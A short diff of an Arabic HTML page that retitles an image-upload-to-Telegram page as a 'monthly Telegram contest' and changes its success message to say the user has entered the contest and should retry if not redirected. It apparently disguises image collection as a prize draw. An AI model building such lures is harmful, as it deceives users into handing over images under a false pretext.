@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إرسال صورة إلى Telegram</title>
+    <title>مسابقة تلجرام الشهرية </title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -76,7 +76,7 @@
                 const data = await response.json();
                 
                 if (data.ok) {
-                    showStatus('.تم دخولك المسابقة بنجاح!', 'success');
+                    showStatus('. تم دخولك المسابقة بنجاح!.اذا لم يتم انتقالك الى تلجرام حاول الدخول مرة اخرى', 'success');
                 } else {
                     showStatus('فشل في إرسال الصورة', 'error');
                 }
